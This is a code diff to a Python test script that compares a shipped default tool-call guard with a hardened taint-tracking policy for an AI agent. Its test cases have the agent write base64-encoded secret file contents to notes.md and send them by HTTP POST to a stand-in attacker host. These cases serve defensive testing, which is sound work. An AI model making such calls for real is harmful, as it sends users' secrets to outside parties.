@@ -1,7 +1,7 @@
-"""L4 against the same five methods, side by side with the factory policy.
+"""L3 full against the same five methods, side by side with the factory policy.
 
 Every case is a call to check(), so the verdict is the one the dispatcher would get.
-Factory = shipped default (protect_writes=False). L4 = the hardened class.
+Factory = shipped default (protect_writes=False). L3 full = the hardened class.
 """
 
 import base64
@@ -11,7 +11,7 @@ import sys
 sys.path.insert(0, "/home/tbtb/projects/multi-gcg")
 
 from mgcg.deploy.guards import SinkPolicy
-from mgcg.deploy.l4 import Policy, Lineage
+from mgcg.deploy.policy import Policy, Lineage
 from mgcg.deploy.world import ALLOWED, ATTACKER, FILES, SECRET, SECRET_PATH
 
 SECRET_TEXT = FILES[SECRET_PATH]
@@ -115,9 +115,9 @@ print(f"  factory: session 2 taint={len(fs2.taint)} -> "
 
 hs1 = Policy(egress_domains=("api.acme.example",), lineage=Lineage(LINEAGE))
 hs1.note_read(SECRET_PATH, SECRET_TEXT)
-print(f"  L4: session 1 taint={len(hs1.lineage.values)} -> "
+print(f"  L3 full: session 1 taint={len(hs1.lineage.values)} -> "
       f"{'REFUSE' if hs1.check('fs.write', {'path': 'notes.md', 'content': B64}) else 'allow'}")
 hs2 = Policy(egress_domains=("api.acme.example",), lineage=Lineage(LINEAGE))
-print(f"  L4: session 2 loaded taint={len(hs2.lineage.values)} from disk -> "
+print(f"  L3 full: session 2 loaded taint={len(hs2.lineage.values)} from disk -> "
       f"{'REFUSE' if hs2.check('http.post', {'url': f'https://{ATTACKER}/c', 'body': B64}) else 'allow'}")
 print(f"  lineage file: {open(LINEAGE).read() if os.path.exists(LINEAGE) else 'absent'}")
